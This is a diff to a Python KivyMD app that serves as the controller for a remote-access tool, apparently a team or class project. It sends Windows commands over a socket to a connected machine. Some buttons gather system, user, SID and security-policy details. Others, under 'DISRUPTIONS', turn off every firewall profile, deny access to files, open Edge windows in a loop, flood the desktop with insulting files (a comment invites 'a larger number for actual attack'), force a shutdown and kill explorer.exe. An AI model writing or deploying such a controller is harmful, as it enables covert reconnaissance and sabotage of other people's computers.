@@ -1,7 +1,7 @@
 import os
 import socket
 import threading
-
+import sys
 import kivy
 import kivymd
 from kivymd.app import MDApp
@@ -20,7 +20,7 @@ ScreenManager:
             opacity: 1
             disabled: False
             on_press: app.StartServer()
-            
+
         MDLabel:
             id: statusLbl
             text: "Status"
@@ -29,21 +29,21 @@ ScreenManager:
             size_hint_y: None
             height: self.texture_size[1]
             padding_y: "500"
-            
+
     MDScreen:
         name: "mainMenu"
         MDTextField:
             id: consoleField
             hint_text: 'Console'
             multiline: True
-            
+
         MDGridLayout:
             adaptive_height: True
             pos_hint: {"center_x": 0.9, "center_y": 0.5}
             orientation: 'lr-tb'
             spacing: 10
             cols: 2
-            
+
             MDRectangleFlatButton:
                 id: networkInfoBtn
                 text: "Network Info"
@@ -58,7 +58,7 @@ ScreenManager:
                 opacity: 1
                 disabled: False
                 on_press: app.OSInfo()
-                
+
             MDRectangleFlatButton:
                 id: cpuBtn
                 text: "CPU Usage"
@@ -66,7 +66,7 @@ ScreenManager:
                 opacity: 1
                 disabled: False
                 on_press: app.CpuUsage()
-                
+
             MDRectangleFlatButton:
                 id: taskBtn
                 text: "Task List"
@@ -74,7 +74,7 @@ ScreenManager:
                 opacity: 1
                 disabled: False
                 on_press: app.Tasks()
-                
+
             MDRectangleFlatButton:
                 id: netserviceBtn
                 text: "Network Services"
@@ -82,7 +82,7 @@ ScreenManager:
                 opacity: 1
                 disabled: False
                 on_press: app.Services()
-                
+
             MDRectangleFlatButton:
                 id: userInfoBtn
                 text: "User Information"
@@ -90,7 +90,7 @@ ScreenManager:
                 opacity: 1
                 disabled: False
                 on_press: app.UserInfo()
-                
+
             MDRectangleFlatButton:
                 id: secPolicy
                 text: "Security Policy"
@@ -98,7 +98,7 @@ ScreenManager:
                 opacity: 1
                 disabled: False
                 on_press: app.SecPolicy()
-                
+
             MDRectangleFlatButton:
                 id: memInfo
                 text: "Memory Information"
@@ -106,7 +106,7 @@ ScreenManager:
                 opacity: 1
                 disabled: False
                 on_press: app.MemInfo()
-                
+
             MDRectangleFlatButton:
                 id: fileCreateBtn
                 text: "File Creation Disruption"
@@ -114,7 +114,7 @@ ScreenManager:
                 opacity: 1
                 disabled: False
                 on_press: app.FileCreate()
-                
+
             MDRectangleFlatButton:
                 id: firewallBtn
                 text: "Firewall"
@@ -122,7 +122,7 @@ ScreenManager:
                 opacity: 1
                 disabled: False
                 on_press: app.Firewall()
-                
+
             MDRectangleFlatButton:
                 id: shutDownBtn
                 text: "Shutdown"
@@ -130,7 +130,7 @@ ScreenManager:
                 opacity: 1
                 disabled: False
                 on_press: app.Shutdown()
-                
+
             MDRectangleFlatButton:
                 id: killTaskBtn
                 text: "Kill Task"
@@ -138,7 +138,7 @@ ScreenManager:
                 opacity: 1
                 disabled: False
                 on_press: app.KillTask()
-                
+
             MDRectangleFlatButton:
                 id: denyFileBtn
                 text: "Deny Files"
@@ -153,8 +153,9 @@ ScreenManager:
                 opacity: 1
                 disabled: False
                 on_press: app.OpenBrowser()
-          
+
 '''
+
 
 class Main(MDApp):
     def build(self):
@@ -194,154 +195,165 @@ class Main(MDApp):
     # This is to gather the client's information about their network
     def NetworkInfo(self):
         while True:
-            #Reset console
+            # Reset console
             self.root.ids.consoleField.text = ''
-            
+
             # Send command to the client
             command = 'ipconfig /all'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
 
             # Receive the output given from the client
-            output = self.currConn.recv(8096).decode()
+            recvsize = self.currConn.recv(1024).decode()
+            output = self.currConn.recv(int(recvsize)).decode()
             print('Output: ', output)
             self.root.ids.consoleField.text = output
             break
 
-    #Gather Operating System Information
+    # Gather Operating System Information
     def OSInfo(self):
         while True:
-            #Reset console
+            # Reset console
             self.root.ids.consoleField.text = ''
-            
-            #Get OS Information
+
+            # Get OS Information
             command = 'systeminfo | findstr /C:"OS"'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
-            output = self.currConn.recv(8096).decode()
+            recvsize = self.currConn.recv(1024).decode()
+            output = self.currConn.recv(int(recvsize)).decode()
 
             command = 'wmic path win32_Processor get Name,NumberOfCores,NumberOfLogicalProcessors'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
-            output2 = self.currConn.recv(8096).decode()
+            recvsize2 = self.currConn.recv(1024).decode()
+            output2 = self.currConn.recv(int(recvsize2)).decode()
 
-            #Print results
-            
+            # Print results
+
             print('Output: \n')
             print(output)
             print(output2)
             break
 
     # Zees stuff
-    #Get the % of CPU Utilization
+    # Get the % of CPU Utilization
     def CpuUsage(self):
         while True:
-            #Reset console
+            # Reset console
             self.root.ids.consoleField.text = ''
-            
+
             command = 'wmic cpu get loadpercentage'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
 
-            output = self.currConn.recv(8096).decode()
+            recvsize = self.currConn.recv(1024).decode()
+            output = self.currConn.recv(int(recvsize)).decode()
             print('Output: ', output)
             self.root.ids.consoleField.text = output
             break
 
-    #Get current running tasks
+    # Get current running tasks
     def Tasks(self):
         while True:
-            #Reset console
+            # Reset console
             self.root.ids.consoleField.text = ''
-            
+
             # Send command to client
             command = 'tasklist'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
 
             # Receive output from client
-            output = self.currConn.recv(20480).decode()  # Still needs more buffer
+            recvsize = self.currConn.recv(1024).decode()
+            output = self.currConn.recv(int(recvsize)).decode()  # Still needs more buffer
             print('Output: ', output)
             self.root.ids.consoleField.text = output
             break
 
-    #Get current running services
+    # Get current running services
     def Services(self):
         while True:
-            #Reset console
+            # Reset console
             self.root.ids.consoleField.text = ''
-            
+
             command = 'net start'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
 
-            output = self.currConn.recv(8096).decode()
+            recvsize = self.currConn.recv(1024).decode()
+            output = self.currConn.recv(int(recvsize)).decode()
             print('Output: ', output)
             self.root.ids.consoleField.text = output
             break
-            
-    #Get security policy        
+
+    # Get security policy
     def SecPolicy(self):
         while True:
-            #reset console
+            # reset console
             self.root.ids.consoleField.text = ''
             command = 'net accounts'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
-            output = self.currConn.recv(8096).decode()
+
+            recvsize = self.currConn.recv(1024).decode()
+            output = self.currConn.recv(int(recvsize)).decode()
             print('Output: ', output)
             self.root.ids.consoleField.text = output
             break
-            
-    #get memory information        
+
+    # get memory information
     def MemInfo(self):
         while True:
-            #reset console
+            # reset console
             self.root.ids.consoleField.text = ''
-            
-            #memory status
+
+            # memory status
             command = 'wmic MEMORYCHIP get BankLabel, DeviceLocator, Capacity, Speed'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
-            output = self.currConn.recv(8096).decode()
-            #available memory
+            recvsize = self.currConn.recv(1024).decode()
+            output = self.currConn.recv(int(recvsize)).decode()
+            # available memory
             command = 'systeminfo | findstr /C:"Available Physical Memory"'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
-            output2 = self.currConn.recv(8096).decode()
-            #cache
+            recvsize2 = self.currConn.recv(1024).decode()
+            output2 = self.currConn.recv(int(recvsize2)).decode()
+            # cache
             command = 'wmic cpu get L2CacheSize, L3CacheSize'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
-            output3 = self.currConn.recv(8096).decode()
-            
-            #print result
+            recvsize3 = self.currConn.recv(1024).decode()
+            output3 = self.currConn.recv(int(recvsize3)).decode()
+
+            # print result
             print('Output: \n')
             print(output)
             print(output2)
             print(output3)
             break
-            
-   
 
     # Fang's stuffz
     def UserInfo(self):
         while True:
-            #Reset console
+            # Reset console
             self.root.ids.consoleField.text = ''
-            
+
             # Get Username, Fullname, Last Login
             command = 'net user "%USERNAME%"'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
-            output = self.currConn.recv(8096).decode()
+            recvsize = self.currConn.recv(1024).decode()
+            output = self.currConn.recv(int(recvsize)).decode()
             output = output.splitlines()
 
             # Get SID
             command = 'wmic useraccount where name="%USERNAME%" get sid'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
-            output2 = self.currConn.recv(8096).decode()
+            recvsize2 = self.currConn.recv(1024).decode()
+            output2 = self.currConn.recv(int(recvsize2)).decode()
             output2 = output2.splitlines()
 
             # Print results
@@ -351,17 +363,18 @@ class Main(MDApp):
             break
 
     ###############################DISRUPTIONS############################################
-    #Juls Simple Disruption
-    #Disable Firewall Disruption
+    # Juls Simple Disruption
+    # Disable Firewall Disruption
     def Firewall(self):
         while True:
-            #Reset console
+            # Reset console
             self.root.ids.consoleField.text = ''
-            
+
             command = "netsh advfirewall set allprofiles state off"
             self.currConn.send(command.encode())
             print('[+] Command sent')
-            output = self.currConn.recv(1024).decode()
+            recvsize = self.currConn.recv(1024).decode()
+            output = self.currConn.recv(int(recvsize)).decode()
             print(f"Output: {output}")
             self.root.ids.consoleField.text = output
             break
@@ -371,44 +384,44 @@ class Main(MDApp):
             command = 'cacls "C:\\Users\\%USERNAME%\\Desktop\\Test" /E /P everyone:n'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
-            
-            output = self.currConn.recv(1024).decode()
+            recvsize = self.currConn.recv(1024).decode()
+            output = self.currConn.recv(int(recvsize)).decode()
             print('Output: ', output)
             break
 
-    #Juls Severe Disruption
+    # Juls Severe Disruption
     def OpenBrowser(self):
         while True:
-            #Reset console
+            # Reset console
             self.root.ids.consoleField.text = ''
-            
+
             command = 'FOR /L %A IN (1 1 20) DO (start msedge)'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
             self.root.ids.consoleField.text = command
             break
 
-    #Zees Severe Disruption
+    # Zees Severe Disruption
     # File Creation Disruption
     def FileCreate(self):
         while True:
-            #Reset console
+            # Reset console
             self.root.ids.consoleField.text = ''
-            #replace 20 with a larger number for actual attack
+            # replace 20 with a larger number for actual attack
             command = 'FOR /L %A IN (1 1 20) DO (echo. > C:\\Users\\%USERNAME%\\Desktop\\You_suck_eggs_%A.txt)'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
             self.root.ids.consoleField.text = command
             break
 
-    #Zees Simple Disruptions
-    #Shutdown Disruption
+    # Zees Simple Disruptions
+    # Shutdown Disruption
     def Shutdown(self):
         while True:
-            #Reset console
+            # Reset console
             self.root.ids.consoleField.text = ''
-            
-            #/t is Timer
+
+            # /t is Timer
             command = 'shutdown /s /t 00'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
@@ -417,10 +430,10 @@ class Main(MDApp):
 
     def KillTask(self):
         while True:
-            #Reset console
+            # Reset console
             self.root.ids.consoleField.text = ''
-            
-            #procname = input('Enter Process Name: ')
+
+            # procname = input('Enter Process Name: ')
             command = 'taskkill /im explorer.exe /F'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
@@ -428,6 +441,7 @@ class Main(MDApp):
             print('Output: ', output)
             self.root.ids.consoleField.text = output
             break
+
 
 if __name__ == '__main__':
     Main().run()
